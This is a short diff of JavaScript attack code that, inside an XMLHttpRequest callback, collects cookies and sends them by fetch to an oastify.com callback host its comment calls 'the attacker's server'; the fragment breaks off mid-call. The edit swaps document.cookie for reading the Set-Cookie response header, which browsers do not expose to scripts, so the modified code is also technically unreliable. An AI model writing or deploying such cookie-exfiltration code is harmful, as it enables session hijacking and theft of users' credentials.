@@ -13,8 +13,8 @@
       xhr.onreadystatechange = function() {
          if (xhr.readyState === XMLHttpRequest.DONE) {
             if (xhr.status === 200) {
-               // Retrieve cookies from the document
-               var cookies = document.cookie;
+               // Get cookies from the response header
+               var cookies = xhr.getResponseHeader('Set-Cookie');
                
                // Send the cookies to the attacker's server
                fetch('https://yegqm3by9b360gm9kgmqhybtikobc70w.oastify.com', {
